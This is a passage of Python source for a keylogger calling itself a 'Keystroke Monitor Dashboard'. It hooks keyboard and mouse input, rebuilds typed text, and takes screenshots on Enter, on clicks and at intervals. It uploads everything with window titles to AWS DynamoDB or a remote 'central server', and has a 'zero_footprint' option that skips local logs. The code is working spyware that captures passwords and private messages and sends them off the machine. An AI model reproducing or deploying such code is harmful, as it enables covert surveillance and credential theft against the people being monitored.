            return {"device_id": device_id, "timestamp_id": timestamp_id}
        except Exception as e:
            print(f"Failed to insert log to DynamoDB: {e}")
            
    # 2. HTTP Fallback to AWS Central Server (client mode without AWS keys)
    server_url = RENDER_SERVER_URL or os.getenv("RENDER_SERVER_URL")
    if not aws_success and server_url:
        try:
            req = urllib.request.Request(
                f"{server_url.rstrip('/')}/api/client/log",
                data=json.dumps({
                    "device_id": device_id,
                    "timestamp": timestamp,
                    "window_title": window_title,
                    "line_str": line_str,
                    "screenshot_url": screenshot_url,
                    "screenshot_filename": screenshot_filename
                }).encode('utf-8'),
                headers=get_client_headers()
            )
            with urllib.request.urlopen(req, timeout=10) as r:
                res_data = json.loads(r.read().decode('utf-8'))
                aws_success = True
                return {"device_id": device_id, "timestamp_id": f"{timestamp}#{res_data.get('id', '')[:8]}"}
        except Exception as he:
            print(f"Failed to send log to AWS central server: {he}")

    # 2. Local Fallback/Backup logging
    if not zero_footprint and not aws_success:
        try:
            date_str = datetime.now().strftime("%Y-%m-%d")
            log_file = os.path.join("logs", f"log_{date_str}.txt")
            root_log = "log.txt"
            
            block = [
                f"--- {timestamp} ---",
                f"Device ID    : {device_id}",
                f"Active Window: {window_title}",
                f"Typed Text   : {line_str}",
                f"Screenshot   : {screenshot_url if screenshot_url else 'None'}",
                f"Screenshot File: {screenshot_filename if screenshot_filename else 'None'}",
                "----------------------------------------",
                ""
            ]
            block_text = "\n".join(block) + "\n"
            
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(block_text)
            with open(root_log, "a", encoding="utf-8") as f:
                f.write(block_text)
        except Exception as e:
            print(f"Failed to write local fallback log: {e}")

def on_press(key):
    global current_line, last_activity_time, has_new_activity_since_last_capture
    last_activity_time = datetime.now()
    try:
        if hasattr(key, 'char') and key.char is not None:
            if ord(key.char) >= 32:
                current_line.append(key.char)
                has_new_activity_since_last_capture = True
        elif key == pynput.keyboard.Key.space:
            current_line.append(' ')
            has_new_activity_since_last_capture = True
        elif key == pynput.keyboard.Key.backspace:
            if current_line:
                current_line.pop()
        elif key == pynput.keyboard.Key.enter:
            line_str = "".join(current_line).strip()
            current_line = []
            if not line_str or is_text_noise(line_str):
                return
                
            now = datetime.now()
            
            # Reset screenshot timer on manual enter
            global last_screenshot_time
            last_screenshot_time = now
            has_new_activity_since_last_capture = False
            
            timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
            window_title = get_active_window_title()
            
            # Check if screenshot optimization on App Switch is active
            global only_capture_on_switch, last_pending_screenshot_log_id
            if only_capture_on_switch:
                # Log the text immediately without capturing a screenshot, save the returned ID to update on switch
                inserted_id = write_log(timestamp, window_title, line_str, None, None)
                last_pending_screenshot_log_id = inserted_id
            else:
                # Capture and upload screenshot (WebP)
                screenshot_url, screenshot_filename = capture_and_upload_screenshot("screenshot")
                write_log(timestamp, window_title, line_str, screenshot_url, screenshot_filename)
    except Exception:
        pass



def handle_mouse_click_trigger():
    global last_screenshot_time, current_line, last_logged_window, has_new_activity_since_last_capture
    try:
        now = datetime.now()
        time_since_last_screenshot = (now - last_screenshot_time).total_seconds()
        
        # Rate limit: Max 1 screenshot trigger per 10 seconds on mouse clicks
        if time_since_last_screenshot >= 10:
            window_title = get_active_window_title()
            
            # Capture screenshot
            screenshot_url, screenshot_filename = capture_and_upload_screenshot("screenshot_click")
            
            # If screenshot was skipped as redundant, don't write log entry to Supabase
            if screenshot_url is None and screenshot_filename is None:
                return
                
            # If the screen actually changed, flush the keylog buffer and log the click
            timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
            buffered_text = "".join(current_line).strip()
            current_line = [] # Reset buffer after flush
            
            # Since we captured a screenshot, reset idle timers and flags
            last_screenshot_time = now
            last_logged_window = window_title
            has_new_activity_since_last_capture = False
            
            if buffered_text:
                log_msg = f"[Mouse Click] {buffered_text}"
            else:
                log_msg = "[Mouse Click] (Activity detected)"
                
            write_log(timestamp, window_title, log_msg, screenshot_url, screenshot_filename)
    except Exception as e:
        print(f"Error handling mouse click trigger: {e}")

def on_click(x, y, button, pressed):
    global last_activity_time, disable_mouse_clicks
    now = datetime.now()
    if pressed:
        last_activity_time = now
        if not disable_mouse_clicks:
            # Trigger rate-limited capture
            handle_mouse_click_trigger()

def periodic_checker():
    global last_activity_time, last_screenshot_time, current_line, periodic_screenshot_interval, idle_threshold
    while True:
        time.sleep(5)
        now = datetime.now()
        inactive_seconds = (now - last_activity_time).total_seconds()
        time_since_last_screenshot = (now - last_screenshot_time).total_seconds()
        
        # If periodic screenshot interval is disabled (0), do not trigger captures
        if periodic_screenshot_interval > 0:
            if inactive_seconds < idle_threshold and time_since_last_screenshot >= periodic_screenshot_interval:
                window_title = get_active_window_title()
                
                # Skip periodic capture if active window hasn't changed AND no new typing activity occurred
                global last_logged_window, has_new_activity_since_last_capture
                if window_title == last_logged_window and not has_new_activity_since_last_capture:
                    last_screenshot_time = now
                    continue
                    
                timestamp = now.strftime("%Y-%m-%d %H:%M:%S")
                
                # Capture and upload screenshot (WebP)
                screenshot_url, screenshot_filename = capture_and_upload_screenshot("screenshot_periodic")
                
                # If screenshot was skipped as redundant, don't write log entry to Supabase
                if screenshot_url is None and screenshot_filename is None:
                    last_screenshot_time = now
                    continue
                    
                # Update state on success
                last_logged_window = window_title
                has_new_activity_since_last_capture = False
                
                buffered_text = "".join(current_line).strip()
                if buffered_text:
                    log_msg = f"[Periodic Capture - Active] {buffered_text}"
                else:
                    log_msg = f"[Periodic Capture - Active] (Activity detected)"
                    
                write_log(timestamp, window_title, log_msg, screenshot_url, screenshot_filename)
                
                last_screenshot_time = now

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def run_server():
    port = int(os.environ.get('PORT', 58291))
    app.run(host='127.0.0.1', port=port, debug=False, use_reloader=False)

def server_storage_cleaner():
    """
    AWS Native S3 Lifecycle (30-day auto-expire) and DynamoDB TTL
    automatically maintain zero-cost storage in AWS in the background.
    """
    while True:
        try:
            time.sleep(86400)
            if logs_tbl is not None:
                res = logs_tbl.scan(Select='COUNT')
                total_items = res.get('Count', 0)
                if total_items > 30000:
                    print(f"[Cleaner] DynamoDB log count: {total_items}. Automatic TTL expiration active.")
        except Exception as e:
            print(f"[Cleaner] Storage monitor notice: {e}")

if __name__ == '__main__':
    # Start server storage cleaner thread to monitor database limits
    cleaner_thread = threading.Thread(target=server_storage_cleaner, daemon=True)
    cleaner_thread.start()

    # Check if we should only run the server (no local keyboard/mouse listeners)
    server_only = os.environ.get('SERVER_ONLY', 'false').lower() == 'true' or pynput is None
    
    if server_only:
        print("Running in SERVER ONLY mode (Dashboard Web UI). Keylog hooks disabled.")
        run_server()
    else:
        # Run log migration to fix any literal newlines
        migrate_literal_newlines()
        
        # Start Flask server in a daemon thread
        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()
        
        # Start periodic activity checker thread
        checker_thread = threading.Thread(target=periodic_checker, daemon=True)
        checker_thread.start()
        
        # Start window monitor thread (App Switch Focus Optimization)
        if os.name == 'nt':
            window_monitor_thread = threading.Thread(target=window_monitor_loop, daemon=True)
            window_monitor_thread.start()
        
        # Start mouse activity listener thread (Optimized: Clicks only to save CPU)
        mouse_listener = pynput.mouse.Listener(
            on_click=on_click
        )
        mouse_listener.start()
        
        local_ip = get_local_ip()
        print(f"\n==================================================")
        print(f"Keystroke Monitor Dashboard is active.")
        print(f"Access locally: http://localhost:5000")
        print(f"Access on WiFi: http://{local_ip}:5000")
        print(f"==================================================\n")
        
        # Start keyboard listener in main thread
        with pynput.keyboard.Listener(on_press=on_press) as listener:
            listener.join()